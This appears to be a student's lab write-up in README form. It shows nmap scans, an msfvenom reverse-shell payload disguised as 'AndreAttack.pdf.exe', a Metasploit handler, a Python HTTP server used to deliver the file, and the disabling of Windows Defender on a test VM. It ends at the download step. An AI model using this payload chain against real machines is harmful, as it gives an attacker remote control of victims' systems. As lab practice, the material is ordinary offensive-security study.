### Step 1: Checking Nmap Commands and Syntax
- Used the command:
  ```bash
  nmap -h
![Step1](https://github.com/user-attachments/assets/ee1f6cfa-cd10-4520-becc-d57480418288)


### Step 2: Used nmap -A with my windows machine IP to check for open ports
- Used the command:
  ```bash
  nmap -A
![Step2 1](https://github.com/user-attachments/assets/cfb32c6e-12c7-4496-b523-9e1cb9ab7cdb)


### Step 3: - Used command "msfvenom -l payloads" to check for commands with payloads used "-l"  and "payloads" to list the payloads commands
- Used the command:
  ```bash
  msfvenom -l
![Step3_Payloads](https://github.com/user-attachments/assets/ad3632bf-3a7f-4694-a9dc-08c4884ae7df)


### Step 4: -From the payloads, I selected the `"windows/x64/meterpreter_reverse_tcp"`, and proceeded with this command:
```bash
windows/x64/meterpreter_reverse_tcp lhost=192.132.69.50 lport=4444 -f exe -o AndreAttack.pdf.exe
```
![Step4](https://github.com/user-attachments/assets/ae135d67-802a-4c91-ae55-08cc54904c31)

With this command i added the host ip (my Kali VM), and a random port `4444`.This command will generate a malware using meterpreter reverse tcp load. Which is instructed to connect back to our machine based on `lhost`, the file format will be in ".exe" with the name of `AndreAttack.pdf`,
as you can see from the screenshot below, i successed created the file and checked if the file is present using the `ls` command.
As we can see by using `file` we can access the file contents.

![step4 1](https://github.com/user-attachments/assets/d9d87b86-b10d-431d-ae7b-ee3f841dc85e)


### Step 5: - In this step i used metasploit by typing the command `msfconsole`.
- Used the command:
  ```bash
  msf
 ![6t](https://github.com/user-attachments/assets/559904d9-c420-4f0d-8660-bfbd59598c37)
### 5.1 Then proceeded to `use exploit/multi/handler`, and then `options`, to see what we can configure.
![5 1](https://github.com/user-attachments/assets/4da75551-7f64-4776-a1f9-fdfaed6e88cd)


### Step 6: We can see the payloadoptions to "generic/shell_reverse_tcp", i will change this payload so it can be the same payload that i use when configuring the malware on msfvenom earlier.
- Used the command:
  ```bash
  set payload windows/x64/meterpreter/reverse_tcp
  ```
Then i applied `options` again to change to my command.

![6 1](https://github.com/user-attachments/assets/ae64a0ed-617d-4083-b13b-9a15ad35d50d)

### 6.1 In here i configured `LHOST` to set to the attacker machine IP (My kali VM), using the command `set lhost 192.132.69.50`

![7 0](https://github.com/user-attachments/assets/79c46239-1407-438b-892b-da1b4d92c9e2)
#### As we can see from the image we now have our signed IP.
![image](https://github.com/user-attachments/assets/c0d81579-a22c-4a12-821e-bae569a21c8f)

### Step 7: Now we type `exploit` so our test machine start executing the malware! ☠️
![8](https://github.com/user-attachments/assets/d7778d6d-77bb-424b-ae25-a2145fe28fb6)


### Step 8: We must setup a quick `HTTP` server on my KALI machine so my test machine can download the malware.
To setup this **HTTP** server i decided to use **Python**! -> This will allow my target machine(windows vm) to access my KALI machine.

(Note: For this to work i had to go to my Windows Test Machine and disable windows defender and disable **Real time protection**!)
- Used the command:
  ```bash
  python3 -m http.server 9999
  ```
  ![9](https://github.com/user-attachments/assets/6aad7439-742e-46aa-aacf-82e7c98798d9)



### Step10- Now i placed the adress(my VM IP server), into my Windows VM, and we got this result seeing the malware file i created earlier with the name `AndreAttack.pdf.exe`. 
so i proceeded to download it.
